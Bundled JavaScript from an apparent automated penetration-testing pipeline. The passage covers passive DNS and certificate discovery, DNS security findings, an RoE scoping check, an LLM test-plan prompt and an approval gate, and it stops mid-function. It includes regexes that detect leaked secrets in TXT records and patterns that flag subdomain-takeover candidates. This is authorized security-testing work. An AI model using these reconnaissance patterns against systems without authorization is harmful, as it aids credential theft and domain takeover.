import {
  exploit_selection_intelligence_exports,
  init_exploit_selection_intelligence
} from "./chunk-DACF3QRL.js";
import {
  context_aware_scanner_exports,
  init_context_aware_scanner
} from "./chunk-HPRQMQNG.js";
import {
  context_engine_tracker_exports,
  init_context_engine_tracker
} from "./chunk-7FAMHG36.js";
import {
  init_llm_throttle,
  throttledLLMCall
} from "./chunk-UJVJACSD.js";
import {
  executeToolViaQueue,
  init_job_queue_bridge
} from "./chunk-KFIWYEF4.js";
import {
  buildBurpKnowledgeContext,
  buildCloudSecurityContext,
  buildGeneralCloudContext,
  buildMethodologyContext,
  buildMissedVulnContext,
  buildOffensiveTechniquesContext,
  buildPhaseToolContext,
  buildSourceSecretsContext,
  buildThreatActorLearningContext,
  buildToolRecommendationContext,
  buildZAPKnowledgeContext,
  clearKnowledgeCache,
  formatOntologyForPrompt,
  getOwaspScanPlanContext,
  getScanforgeScanPlanContext,
  getThreatGroupScanContext,
  getTrainingExamplesForPrompt,
  getTriageCorpusContext,
  init_knowledge_lazy,
  scoreEngagementThreatAttribution
} from "./chunk-QYG54F7J.js";
import {
  captureDecision,
  init_engagement_training_bridge
} from "./chunk-VVWVPEDB.js";
import {
  buildGobusterCommand,
  getScanProfile,
  init_scan_profiles
} from "./chunk-IL4FZKPB.js";
import {
  assessFindings,
  generateEngagementReport,
  getTemplateConfidenceMap,
  init_accuracy_tracker,
  init_auto_promoter,
  init_confidence_tuner,
  init_deep_research_agent,
  init_domain_safety_whitelist,
  isSourceCodeTarget,
  logFinding,
  runAutoPromotion,
  runTargetedResearch,
  validateEngagementTargets
} from "./chunk-L4QEOK4K.js";
import {
  TemplateEngine,
  init_template_engine
} from "./chunk-R4LF5PWF.js";
import {
  getSafetyEngine,
  init_safety_engine
} from "./chunk-4SXJ2GAM.js";
import {
  init_owasp_coverage_tracker,
  resetOwaspTracker
} from "./chunk-7DIV2VRB.js";
import {
  createAnchor,
  flushChainToDb,
  init_evidence_integrity_guardrails
} from "./chunk-75KM7OEW.js";
import {
  classifyVulnClass,
  init_exploit_learning_engine
} from "./chunk-5B4YP4YO.js";
import {
  DnsSecurityValidator,
  init_dns_security_validator
} from "./chunk-G45ZFGC3.js";
import {
  SCANFORGE_DEDICATED_IP,
  SCAN_API_KEY,
  init_scan_service_url
} from "./chunk-V7U4LYHE.js";
import {
  emitLLMDecision,
  emitLLMEngagementProgress,
  emitReconComplete,
  emitSystemNotification,
  eventHub,
  init_ws_event_hub
} from "./chunk-YW5WVS53.js";
import {
  init_llm,
  invokeLLM
} from "./chunk-4BQS7LEI.js";
import {
  SERVER_INSTANCE_ID,
  init_server_instance
} from "./chunk-KUPDIQVG.js";
import {
  __esm,
  __export,
  __toCommonJS
} from "./chunk-KFQGP6VL.js";

// server/lib/pipeline-phases.ts
async function executePassiveDiscovery(state, engagement, addLog2, broadcastOpsUpdate2) {
  state.phase = "passive_discovery";
  state.currentAction = "Running passive discovery & enumeration...";
  addLog2(state, {
    phase: "passive_discovery",
    type: "info",
    title: "\u{1F50E} Phase 2: Passive Discovery & Enumeration",
    detail: "Analyzing DNS records, certificates, technologies, and breach exposure using passive techniques only. No active scanning \u2014 safe to run before RoE signing."
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_change", phase: "passive_discovery" });
  const result = {
    subdomains: [],
    dnsRecords: {},
    certificates: [],
    technologies: [],
    cloudProviders: [],
    emailAddresses: [],
    breachExposure: [],
    dnsSecurityFindings: [],
    passiveServices: []
  };
  const domains = state.assets?.map((a) => a.hostname).filter(Boolean) || [];
  const passiveRecon = state.passiveReconResults || {};
  addLog2(state, {
    phase: "passive_discovery",
    type: "scan_start",
    title: "DNS Record Enumeration",
    detail: `Querying all DNS record types for ${domains.length} domains`
  });
  for (const domain of domains) {
    try {
      const reconData = passiveRecon[domain] || {};
      const dnsRecords = {};
      if (reconData.dns) {
        dnsRecords.A = reconData.dns.a || [];
        dnsRecords.AAAA = reconData.dns.aaaa || [];
        dnsRecords.CNAME = reconData.dns.cname || [];
        dnsRecords.MX = reconData.dns.mx || [];
        dnsRecords.NS = reconData.dns.ns || [];
        dnsRecords.TXT = reconData.dns.txt || [];
        dnsRecords.SOA = reconData.dns.soa;
        dnsRecords.SRV = reconData.dns.srv || [];
        dnsRecords.CAA = reconData.dns.caa || [];
      }
      result.dnsRecords[domain] = dnsRecords;
      const dnsFindings = analyzeDnsSecurity(domain, dnsRecords, reconData);
      result.dnsSecurityFindings.push(...dnsFindings);
      if (dnsFindings.length > 0) {
        addLog2(state, {
          phase: "passive_discovery",
          type: "finding",
          title: `DNS Security: ${domain}`,
          detail: `Found ${dnsFindings.length} DNS security issues: ${dnsFindings.map((f) => f.title).join(", ")}`
        });
      }
    } catch (err) {
      addLog2(state, {
        phase: "passive_discovery",
        type: "warning",
        title: `DNS Enumeration Failed: ${domain}`,
        detail: err.message
      });
    }
  }
  addLog2(state, {
    phase: "passive_discovery",
    type: "scan_start",
    title: "Certificate Transparency Mining",
    detail: `Analyzing certificates and CT logs for ${domains.length} domains`
  });
  for (const domain of domains) {
    const reconData = passiveRecon[domain] || {};
    if (reconData.certificates) {
      for (const cert of reconData.certificates) {
        result.certificates.push({
          domain: cert.domain || domain,
          issuer: cert.issuer || "Unknown",
          validFrom: cert.validFrom || cert.notBefore || "",
          validTo: cert.validTo || cert.notAfter || "",
          subjectAltNames: cert.subjectAltNames || cert.sans || [],
          signatureAlgorithm: cert.signatureAlgorithm,
          keySize: cert.keySize
        });
        const sans = cert.subjectAltNames || cert.sans || [];
        for (const san of sans) {
          const cleanSan = san.replace(/^\*\./, "");
          if (cleanSan.endsWith(domain) && !result.subdomains.includes(cleanSan)) {
            result.subdomains.push(cleanSan);
          }
        }
      }
    }
    if (reconData.subdomains) {
      for (const sub of reconData.subdomains) {
        if (!result.subdomains.includes(sub)) {
          result.subdomains.push(sub);
        }
      }
    }
  }
  addLog2(state, {
    phase: "passive_discovery",
    type: "info",
    title: `Certificates Analyzed`,
    detail: `Found ${result.certificates.length} certificates, ${result.subdomains.length} unique subdomains`
  });
  for (const domain of domains) {
    const reconData = passiveRecon[domain] || {};
    if (reconData.technologies) {
      for (const tech of reconData.technologies) {
        if (!result.technologies.includes(tech)) {
          result.technologies.push(tech);
        }
      }
    }
    if (reconData.cloudProviders) {
      for (const cp of reconData.cloudProviders) {
        if (!result.cloudProviders.includes(cp)) {
          result.cloudProviders.push(cp);
        }
      }
    }
    if (reconData.waf) {
      result.wafDetected = reconData.waf;
    }
  }
  for (const domain of domains) {
    const reconData = passiveRecon[domain] || {};
    if (reconData.emails) {
      for (const email of reconData.emails) {
        if (!result.emailAddresses.includes(email)) {
          result.emailAddresses.push(email);
        }
      }
    }
    if (reconData.breaches) {
      for (const breach of reconData.breaches) {
        result.breachExposure.push({
          source: breach.source || breach.name || "Unknown",
          date: breach.date,
          dataTypes: breach.dataTypes || breach.dataClasses || [],
          recordCount: breach.recordCount || breach.pwnCount
        });
      }
    }
  }
  for (const domain of domains) {
    const reconData = passiveRecon[domain] || {};
    if (reconData.shodan?.ports) {
      for (const portInfo of reconData.shodan.ports) {
        result.passiveServices.push({
          host: domain,
          port: portInfo.port,
          service: portInfo.service || portInfo.product || "unknown",
          source: "shodan_passive",
          confidence: "medium"
        });
      }
    }
    const dnsRecords = result.dnsRecords[domain];
    if (dnsRecords?.SRV) {
      for (const srv of dnsRecords.SRV) {
        result.passiveServices.push({
          host: srv.target,
          port: srv.port,
          service: `srv_${domain}`,
          source: "dns_srv",
          confidence: "high"
        });
      }
    }
  }
  let dnsSecurityReport = null;
  try {
    const dnsValidator = new DnsSecurityValidator(engagement.targetDomain || state.domain, "di_scan");
    dnsSecurityReport = await dnsValidator.runFullAssessment();
    addLog2(state, {
      phase: "passive_discovery",
      type: "info",
      title: "\u{1F6E1}\uFE0F DNS Security Assessment Complete",
      detail: `${dnsSecurityReport.summary.totalChecks} checks performed. Risk: ${dnsSecurityReport.summary.overallRisk.toUpperCase()}. Findings: ${dnsSecurityReport.summary.critical} critical, ${dnsSecurityReport.summary.high} high, ${dnsSecurityReport.summary.medium} medium, ${dnsSecurityReport.summary.low} low.`
    });
  } catch (err) {
    addLog2(state, {
      phase: "passive_discovery",
      type: "warning",
      title: "\u26A0\uFE0F DNS Security Assessment Partial",
      detail: `DNS security validator encountered an error: ${err.message}. Basic DNS checks from passive recon still apply.`
    });
  }
  state.passiveDiscovery = {
    completedAt: Date.now(),
    subdomains: result.subdomains,
    dnsRecords: result.dnsRecords,
    certificates: result.certificates,
    technologies: result.technologies,
    cloudProviders: result.cloudProviders,
    wafDetected: result.wafDetected,
    emailAddresses: result.emailAddresses,
    breachExposure: result.breachExposure,
    dnsSecurityReport
  };
  addLog2(state, {
    phase: "passive_discovery",
    type: "phase_complete",
    title: "\u2705 Phase 2 Complete",
    detail: `${result.subdomains.length} subdomains, ${result.certificates.length} certs, ${result.technologies.length} technologies, ${result.dnsSecurityFindings.length} DNS security findings, ${result.passiveServices.length} passive service hints`
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_complete", phase: "passive_discovery" });
  return result;
}
function analyzeDnsSecurity(domain, records, reconData) {
  const findings = [];
  if (records.CNAME) {
    for (const cname of records.CNAME) {
      const danglingPatterns = [
        /\.s3\.amazonaws\.com$/,
        /\.cloudfront\.net$/,
        /\.herokuapp\.com$/,
        /\.ghost\.io$/,
        /\.github\.io$/,
        /\.azurewebsites\.net$/,
        /\.trafficmanager\.net$/,
        /\.cloudapp\.azure\.com$/,
        /\.elasticbeanstalk\.com$/,
        /\.s3-website.*\.amazonaws\.com$/,
        /\.zendesk\.com$/,
        /\.shopify\.com$/,
        /\.fastly\.net$/,
        /\.pantheonsite\.io$/,
        /\.netlify\.app$/,
        /\.vercel\.app$/,
        /\.surge\.sh$/,
        /\.bitbucket\.io$/,
        /\.wordpress\.com$/,
        /\.tumblr\.com$/,
        /\.unbounce\.com$/,
        /\.helpjuice\.com$/,
        /\.helpscoutdocs\.com$/,
        /\.feedpress\.me$/,
        /\.myshopify\.com$/,
        /\.statuspage\.io$/,
        /\.uservoice\.com$/,
        /\.readme\.io$/,
        /\.tictail\.com$/
      ];
      const isDanglingCandidate = danglingPatterns.some((p) => p.test(cname));
      if (isDanglingCandidate) {
        findings.push({
          category: "dangling_cname",
          severity: "high",
          title: `Potential Dangling CNAME: ${cname}`,
          detail: `CNAME record points to ${cname} which is a third-party service. If the service is no longer active, this creates a subdomain takeover vulnerability.`,
          record: `${domain} CNAME ${cname}`,
          remediation: "Verify the CNAME target is actively claimed. If the service is decommissioned, remove the CNAME record immediately.",
          nistReference: "NIST SP 800-81r3 \xA74.2 \u2014 External Domain Name Integrity"
        });
      }
    }
  }
  const hasDNSSEC = records.DNSKEY && records.DNSKEY.length > 0;
  const hasDS = records.DS && records.DS.length > 0;
  if (!hasDNSSEC && !hasDS) {
    findings.push({
      category: "dnssec_missing",
      severity: "medium",
      title: "DNSSEC Not Deployed",
      detail: `No DNSKEY or DS records found for ${domain}. DNS responses are not cryptographically signed, making them vulnerable to cache poisoning and man-in-the-middle attacks.`,
      remediation: "Deploy DNSSEC with NSEC3 for authenticated denial of existence. Use Algorithm 13 (ECDSAP256SHA256) or Algorithm 15 (Ed25519) per current best practices.",
      nistReference: "NIST SP 800-81r3 \xA73.1 \u2014 DNSSEC Deployment"
    });
  }
  if (records.DNSKEY) {
    for (const key of records.DNSKEY) {
      const weakAlgorithms = [1, 3, 5, 6, 7];
      if (key.algorithm && weakAlgorithms.includes(key.algorithm)) {
        findings.push({
          category: "dnssec_misconfigured",
          severity: "high",
          title: `Weak DNSSEC Algorithm (Algorithm ${key.algorithm})`,
          detail: `DNSKEY uses deprecated algorithm ${key.algorithm}. SHA-1 based algorithms are considered cryptographically weak.`,
          record: `DNSKEY algorithm=${key.algorithm}`,
          remediation: "Migrate to Algorithm 13 (ECDSAP256SHA256) or Algorithm 15 (Ed25519). Perform algorithm rollover per RFC 6781.",
          nistReference: "NIST SP 800-81r3 \xA73.1.2 \u2014 DNSSEC Algorithm Selection"
        });
      }
    }
  }
  if (records.NS && records.NS.length > 0) {
    findings.push({
      category: "zone_transfer",
      severity: "info",
      title: `Zone Transfer Check Required: ${records.NS.length} nameservers`,
      detail: `${records.NS.length} authoritative nameservers identified: ${records.NS.join(", ")}. Active zone transfer testing (AXFR/IXFR) should be performed during the active scanning phase to verify access controls.`,
      remediation: "Restrict zone transfers to authorized secondary nameservers only. Configure ACLs on all authoritative servers.",
      nistReference: "NIST SP 800-81r3 \xA74.1 \u2014 Zone Transfer Security"
    });
  }
  if (records.TXT) {
    const sensitivePatterns = [
      { pattern: /v=spf1/i, type: "SPF", severity: "info" },
      { pattern: /v=DMARC/i, type: "DMARC", severity: "info" },
      { pattern: /v=DKIM/i, type: "DKIM", severity: "info" },
      { pattern: /api[_-]?key/i, type: "API Key", severity: "high" },
      { pattern: /password/i, type: "Password", severity: "critical" },
      { pattern: /secret/i, type: "Secret", severity: "high" },
      { pattern: /token/i, type: "Token", severity: "high" },
      { pattern: /aws[_-]?access/i, type: "AWS Credential", severity: "critical" },
      { pattern: /private[_-]?key/i, type: "Private Key", severity: "critical" }
    ];
    for (const txt of records.TXT) {
      for (const { pattern, type, severity } of sensitivePatterns) {
        if (severity !== "info" && pattern.test(txt)) {
          findings.push({
            category: "information_leakage",
            severity,
            title: `Sensitive Data in TXT Record: ${type}`,
            detail: `TXT record contains potential ${type} data: "${txt.substring(0, 100)}${txt.length > 100 ? "..." : ""}"`,
            record: `${domain} TXT "${txt.substring(0, 50)}..."`,
            remediation: `Remove sensitive data from public DNS TXT records immediately. Rotate any exposed credentials.`,
            nistReference: "NIST SP 800-81r3 \xA74.3 \u2014 DNS Information Leakage"
          });
        }
      }
    }
    const hasSPF = records.TXT.some((t) => /v=spf1/i.test(t));
    const hasDMARC = records.TXT.some((t) => /v=DMARC/i.test(t));
    if (records.MX && records.MX.length > 0) {
      if (!hasSPF) {
        findings.push({
          category: "information_leakage",
          severity: "medium",
          title: "Missing SPF Record",
          detail: `Domain has MX records but no SPF record. This allows email spoofing from this domain.`,
          remediation: "Add an SPF TXT record specifying authorized mail senders.",
          nistReference: "NIST SP 800-81r3 \xA75.2 \u2014 Email Security DNS Records"
        });
      }
      if (!hasDMARC) {
        findings.push({
          category: "information_leakage",
          severity: "medium",
          title: "Missing DMARC Record",
          detail: `Domain has MX records but no DMARC record. DMARC provides email authentication and reporting.`,
          remediation: "Add a DMARC TXT record at _dmarc.domain with at minimum p=none for monitoring.",
          nistReference: "NIST SP 800-81r3 \xA75.2 \u2014 Email Security DNS Records"
        });
      }
    }
  }
  if (records.SOA) {
    const soa = records.SOA;
    if (soa.refresh && soa.refresh > 86400) {
      findings.push({
        category: "zone_drift",
        severity: "low",
        title: "SOA Refresh Too High",
        detail: `SOA refresh interval is ${soa.refresh}s (${(soa.refresh / 3600).toFixed(1)}h). High refresh intervals can cause zone data inconsistency between primary and secondary nameservers.`,
        record: `SOA refresh=${soa.refresh}`,
        remediation: "Set SOA refresh to 3600-14400 seconds (1-4 hours) for most zones.",
        nistReference: "NIST SP 800-81r3 \xA73.3 \u2014 Zone Configuration"
      });
    }
    if (soa.retry && soa.retry > 7200) {
      findings.push({
        category: "zone_drift",
        severity: "low",
        title: "SOA Retry Too High",
        detail: `SOA retry interval is ${soa.retry}s (${(soa.retry / 3600).toFixed(1)}h). If a zone transfer fails, the secondary won't retry for a long time.`,
        record: `SOA retry=${soa.retry}`,
        remediation: "Set SOA retry to 600-3600 seconds (10-60 minutes).",
        nistReference: "NIST SP 800-81r3 \xA73.3 \u2014 Zone Configuration"
      });
    }
  }
  if (records.NS) {
    const nsProviders = /* @__PURE__ */ new Set();
    for (const ns of records.NS) {
      const parts = ns.split(".");
      if (parts.length >= 2) {
        nsProviders.add(parts.slice(-2).join("."));
      }
    }
    if (nsProviders.size > 2) {
      findings.push({
        category: "lame_delegation",
        severity: "medium",
        title: `Multiple NS Providers Detected (${nsProviders.size})`,
        detail: `Nameservers span ${nsProviders.size} different providers: ${[...nsProviders].join(", ")}. This increases the risk of lame delegation if any provider contract lapses.`,
        remediation: "Consolidate nameservers to 1-2 providers. Ensure all NS records point to actively maintained servers.",
        nistReference: "NIST SP 800-81r3 \xA74.2 \u2014 Lame Delegations"
      });
    }
  }
  findings.push({
    category: "encrypted_dns_missing",
    severity: "info",
    title: "Encrypted DNS Assessment Required",
    detail: `Active testing should verify whether the organization supports DNS-over-TLS (DoT, port 853) and DNS-over-HTTPS (DoH) for resolver traffic. Check for rogue encrypted DNS bypass.`,
    remediation: "Deploy DoT/DoH for all recursive resolver traffic. Block direct DNS queries to external resolvers (8.8.8.8, 1.1.1.1) at the network perimeter.",
    nistReference: "NIST SP 800-81r3 \xA76.1 \u2014 Encrypted DNS Transport"
  });
  return findings;
}
async function executeScopingReview(state, engagement, addLog2, broadcastOpsUpdate2) {
  state.phase = "scoping";
  state.currentAction = "Reviewing scope and Rules of Engagement...";
  addLog2(state, {
    phase: "scoping",
    type: "info",
    title: "\u{1F4CB} Phase 3: Scoping & RoE Review",
    detail: "Validating engagement scope, authorized targets, testing windows, and escalation procedures before test plan generation."
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_change", phase: "scoping" });
  const roeChecklist = [];
  const roeIssues = [];
  const hasTargetDomains = engagement.targetDomain && engagement.targetDomain.trim().length > 0;
  const hasTargetIPs = engagement.targetIpRange && engagement.targetIpRange.trim().length > 0;
  if (hasTargetDomains || hasTargetIPs) {
    roeChecklist.push("\u2705 Authorized targets defined");
  } else {
    roeIssues.push("\u274C No authorized targets defined in RoE");
  }
  if (engagement.roeStatus === "signed") {
    roeChecklist.push("\u2705 RoE signed");
  } else if (engagement.roeStatus === "pending") {
    roeChecklist.push("\u23F3 RoE pending signature");
  } else {
    roeIssues.push("\u274C RoE not signed \u2014 active scanning will be blocked");
  }
  roeChecklist.push(`\u2705 Engagement type: ${engagement.engagementType || "pentest"}`);
  if (engagement.testingWindow || engagement.scheduledStart) {
    roeChecklist.push("\u2705 Testing window defined");
  } else {
    roeIssues.push("\u26A0\uFE0F No testing window defined \u2014 recommend setting authorized testing hours");
  }
  if (engagement.escalationContact || engagement.clientContact) {
    roeChecklist.push("\u2705 Escalation contact defined");
  } else {
    roeIssues.push("\u26A0\uFE0F No escalation contact defined \u2014 recommend adding emergency contact");
  }
  const passiveDiscovery = state.passiveDiscovery || {};
  const scopeSummary = {
    domains: (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean),
    ipRanges: (engagement.targetIpRange || "").split(/[,;\s]+/).filter(Boolean),
    assetsDiscovered: state.assets?.length || 0,
    subdomainsDiscovered: passiveDiscovery.subdomains?.length || 0,
    technologiesDetected: passiveDiscovery.technologies?.length || 0,
    cloudProviders: passiveDiscovery.cloudProviders || [],
    wafDetected: passiveDiscovery.wafDetected
  };
  addLog2(state, {
    phase: "scoping",
    type: "info",
    title: "Scope Summary",
    detail: `Domains: ${scopeSummary.domains.join(", ")} | IPs: ${scopeSummary.ipRanges.join(", ") || "none"} | Assets: ${scopeSummary.assetsDiscovered} | Subdomains: ${scopeSummary.subdomainsDiscovered} | Technologies: ${scopeSummary.technologiesDetected}`,
    data: { scopeSummary }
  });
  const allChecks = [...roeChecklist, ...roeIssues];
  addLog2(state, {
    phase: "scoping",
    type: roeIssues.length > 0 ? "warning" : "info",
    title: `RoE Validation: ${roeChecklist.length}/${allChecks.length} checks passed`,
    detail: allChecks.join("\n"),
    data: { roeChecklist, roeIssues }
  });
  addLog2(state, {
    phase: "scoping",
    type: "phase_complete",
    title: "\u2705 Phase 3 Complete",
    detail: `Scope validated. ${roeIssues.length > 0 ? `${roeIssues.length} issues require attention.` : "All checks passed."} Ready for test plan generation.`
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_complete", phase: "scoping" });
}
async function executeTestPlanGeneration(state, engagement, addLog2, broadcastOpsUpdate2) {
  state.phase = "test_plan";
  state.currentAction = "Generating test plan...";
  addLog2(state, {
    phase: "test_plan",
    type: "info",
    title: "\u{1F4DD} Phase 4: Test Plan Generation",
    detail: "Generating comprehensive penetration test plan aligned with NIST SP 800-115, PTES, and OWASP methodologies. Includes DNS security assessment per NIST SP 800-81r3."
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_change", phase: "test_plan" });
  const passiveDiscovery = state.passiveDiscovery || {};
  const passiveRecon = state.passiveReconResults || {};
  const domains = (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean);
  const ipRanges = (engagement.targetIpRange || "").split(/[,;\s]+/).filter(Boolean);
  const contextSummary = buildTestPlanContext(state, engagement, passiveDiscovery, passiveRecon);
  addLog2(state, {
    phase: "test_plan",
    type: "info",
    title: "LLM Test Plan Generation",
    detail: "Sending engagement context to LLM for comprehensive test plan generation..."
  });
  let testPlanSections = [];
  let attackVectors = [];
  let estimatedDuration = "5-10 business days";
  let toolsPlanned = [];
  let riskMitigations = [];
  try {
    const llmResponse = await throttledLLMCall({
      messages: [
        {
          role: "system",
          content: `You are a senior penetration test planner creating a formal test plan for customer review and approval. The plan must be thorough, professional, and aligned with NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment), PTES (Penetration Testing Execution Standard), and OWASP Testing Guide methodologies.

Do NOT make compliance certification claims (e.g., do not claim the plan is "FedRAMP certified" or "3PAO approved"). Reference standards by their identifiers only.

The test plan must include these sections:
1. Executive Summary \u2014 engagement overview, objectives, and methodology
2. Scope Definition \u2014 authorized targets, exclusions, testing windows
3. Methodology \u2014 assessment approach, phases, and techniques
4. Assessment Attack Vectors \u2014 specific attack vectors mapped to targets
5. DNS Security Assessment \u2014 per NIST SP 800-81r3 (March 2026)
6. Tools & Techniques \u2014 planned tools with justification
7. Risk Mitigation \u2014 safeguards during testing
8. Communication Plan \u2014 escalation procedures, status reporting
9. Timeline & Milestones \u2014 estimated schedule
10. Deliverables \u2014 expected outputs and report format

For the DNS Security Assessment section, include checks for:
- DNSSEC deployment and configuration
- Dangling CNAME / subdomain takeover risks
- Zone transfer exposure (AXFR/IXFR)
- DNS information leakage (TXT, HINFO records)
- Email security (SPF, DKIM, DMARC)
- Encrypted DNS (DoT/DoH) deployment
- Lame delegation risks
- SOA configuration (zone drift/thrash)
- Recursive/authoritative server separation
- Lookalike/typosquat domain detection

Return a JSON object with this exact structure:
{
  "sections": [{ "id": "string", "title": "string", "content": "string (markdown)", "standardsReference": "string" }],
  "attackVectors": [{ "id": "string", "name": "string", "description": "string", "targets": ["string"], "tools": ["string"], "techniques": ["string"], "estimatedDuration": "string", "riskLevel": "critical|high|medium|low" }],
  "estimatedDuration": "string",
  "toolsPlanned": ["string"],
  "riskMitigations": ["string"]
}`
        },
        {
          role: "user",
          content: `Generate a comprehensive test plan for this engagement:

${contextSummary}`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "test_plan",
          strict: false,
          schema: {
            type: "object",
            properties: {
              sections: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    id: { type: "string" },
                    title: { type: "string" },
                    content: { type: "string" },
                    standardsReference: { type: "string" }
                  },
                  required: ["id", "title", "content"]
                }
              },
              attackVectors: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    id: { type: "string" },
                    name: { type: "string" },
                    description: { type: "string" },
                    targets: { type: "array", items: { type: "string" } },
                    tools: { type: "array", items: { type: "string" } },
                    techniques: { type: "array", items: { type: "string" } },
                    estimatedDuration: { type: "string" },
                    riskLevel: { type: "string" }
                  },
                  required: ["id", "name", "description"]
                }
              },
              estimatedDuration: { type: "string" },
              toolsPlanned: { type: "array", items: { type: "string" } },
              riskMitigations: { type: "array", items: { type: "string" } }
            },
            required: ["sections", "attackVectors", "estimatedDuration", "toolsPlanned", "riskMitigations"]
          }
        }
      },
      _caller: `test-plan-${state.engagementId}`
    });
    const parsed = JSON.parse(llmResponse.choices[0].message.content || "{}");
    testPlanSections = (parsed.sections || []).map((s) => ({
      id: s.id || `section-${Math.random().toString(36).slice(2, 8)}`,
      title: s.title || "Untitled Section",
      content: s.content || "",
      standardsReference: s.standardsReference
    }));
    attackVectors = (parsed.attackVectors || []).map((v) => ({
      id: v.id || `av-${Math.random().toString(36).slice(2, 8)}`,
      name: v.name || "Unnamed Vector",
      description: v.description || "",
      targets: v.targets || [],
      tools: v.tools || [],
      techniques: v.techniques || [],
      estimatedDuration: v.estimatedDuration || "TBD",
      riskLevel: v.riskLevel || "medium"
    }));
    estimatedDuration = parsed.estimatedDuration || estimatedDuration;
    toolsPlanned = parsed.toolsPlanned || [];
    riskMitigations = parsed.riskMitigations || [];
    addLog2(state, {
      phase: "test_plan",
      type: "info",
      title: `Test Plan Generated: ${testPlanSections.length} sections, ${attackVectors.length} attack vectors`,
      detail: `Duration: ${estimatedDuration} | Tools: ${toolsPlanned.slice(0, 5).join(", ")}${toolsPlanned.length > 5 ? ` +${toolsPlanned.length - 5} more` : ""}`
    });
  } catch (err) {
    console.error("[TestPlan] LLM generation failed:", err.message);
    addLog2(state, {
      phase: "test_plan",
      type: "warning",
      title: "LLM Test Plan Generation Failed \u2014 Using Structured Fallback",
      detail: `Error: ${err.message}. Generating test plan from structured templates.`
    });
    testPlanSections = generateFallbackTestPlan(state, engagement, passiveDiscovery);
    attackVectors = generateFallbackAttackVectors(state, engagement, passiveDiscovery);
    toolsPlanned = ["scanforge-discovery", "nuclei", "ZAP", "Metasploit", "Burp Suite", "dig", "dnsrecon", "subfinder"];
    riskMitigations = [
      "All testing will be conducted within authorized scope defined in the Rules of Engagement",
      "Emergency stop procedures are in place \u2014 testing can be halted immediately upon request",
      "DNS zone transfer testing will use read-only queries to prevent zone disruption",
      "Exploitation attempts will target only confirmed vulnerabilities with known safe exploits",
      "All actions are logged with timestamps for full audit trail"
    ];
  }
  const dnsAssessment = buildDnsAssessmentPlan(state, passiveDiscovery);
  const testPlan = {
    id: `tp-${state.engagementId}-${Date.now()}`,
    engagementId: state.engagementId,
    engagementType: engagement.engagementType || "pentest",
    generatedAt: Date.now(),
    status: "draft",
    sections: testPlanSections,
    attackVectors,
    dnsAssessment,
    estimatedDuration,
    toolsPlanned,
    riskMitigations,
    scopeSummary: {
      domains,
      ipRanges,
      totalAssets: state.assets?.length || 0,
      totalSubdomains: passiveDiscovery.subdomains?.length || 0,
      cloudProviders: passiveDiscovery.cloudProviders || [],
      technologies: passiveDiscovery.technologies || []
    }
  };
  state.testPlan = {
    id: testPlan.id,
    generatedAt: testPlan.generatedAt,
    status: "draft",
    sections: testPlan.sections,
    attackVectors: testPlan.attackVectors.map((v) => v.name),
    dnsAssessment: testPlan.dnsAssessment,
    estimatedDuration: testPlan.estimatedDuration,
    toolsPlanned: testPlan.toolsPlanned
  };
  addLog2(state, {
    phase: "test_plan",
    type: "phase_complete",
    title: "\u2705 Phase 4 Complete \u2014 Test Plan Ready for Review",
    detail: `Generated ${testPlanSections.length}-section test plan with ${attackVectors.length} attack vectors. DNS assessment includes ${dnsAssessment.checks.length} checks. Status: DRAFT \u2014 awaiting customer approval.`,
    data: { testPlanId: testPlan.id }
  });
  broadcastOpsUpdate2(state.engagementId, { type: "phase_complete", phase: "test_plan" });
  return testPlan;
}
async function executeTestPlanApproval(state, addLog2, broadcastOpsUpdate2) {
  state.phase = "test_plan_approval";
  state.currentAction = "Awaiting test plan approval...";
  if (!state.testPlan) {
    addLog2(state, {
      phase: "test_plan_approval",
      type: "error",
      title: "No Test Plan Found",
      detail: "Cannot request approval \u2014 no test plan has been generated."
    });
    return false;
  }
  state.testPlan.status = "pending_approval";
  addLog2(state, {
    phase: "test_plan_approval",
    type: "approval_request",
    title: "\u{1F4CB} Phase 4b: Test Plan Approval Required",
    detail: "The test plan has been generated and is ready for customer review. Active scanning will not begin until the test plan is approved. Approve the test plan to proceed to active discovery and enumeration."
  });
  broadcastOpsUpdate2(state.engagementId, {
    type: "approval_required",
    phase: "test_plan_approval",
    testPlanId: state.testPlan.id
  });
  const gateId = `tp-approval-${state.engagementId}-${Date.now()}`;
  state.approvalGates.push({
    id: gateId,
    phase: "test_plan_approval",
    riskTier: "yellow",
    title: "Test Plan Approval",
    description: "Customer must review and approve the test plan before active scanning begins.",
    target: state.testPlan.id,
    detail: {
      testPlanId: state.testPlan.id,
      sections: state.testPlan.sections?.length || 0,
      attackVectors: state.testPlan.attackVectors?.length || 0
    },
    status: "pending",
    createdAt: Date.now()
  });
  addLog2(state, {
    phase: "test_plan_approval",
    type: "info",
    title: "Test Plan Submitted for Review",
    detail: "The test plan is now available in the engagement details. The operator can review and approve it to proceed with active scanning."
  });
  return true;
}
function buildTestPlanContext(state, engagement, passiveDiscovery, passiveRecon) {
  const sections = [];
  sections.push(`## Engagement Overview
- Type: ${engagement.engagementType || "pentest"}
- Client: ${engagement.clientName || engagement.name || "Unknown"}
- Sector: ${engagement.sector || engagement.industry || "Not specified"}
- RoE Status: ${engagement.roeStatus || "not signed"}
- Scan Mode: ${engagement.scanMode || "standard"}`);
  const domains = (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean);
  const ipRanges = (engagement.targetIpRange || "").split(/[,;\s]+/).filter(Boolean);
  sections.push(`## Authorized Scope
- Domains: ${domains.join(", ") || "none"}
- IP Ranges: ${ipRanges.join(", ") || "none"}
- Assets Discovered: ${state.assets?.length || 0}
- Subdomains: ${passiveDiscovery.subdomains?.length || 0}`);
  if (passiveDiscovery.technologies?.length > 0) {
    sections.push(`## Technologies Detected
${passiveDiscovery.technologies.join(", ")}`);
  }
  if (passiveDiscovery.cloudProviders?.length > 0) {
    sections.push(`## Cloud Providers
${passiveDiscovery.cloudProviders.join(", ")}`);
  }
  if (passiveDiscovery.wafDetected) {
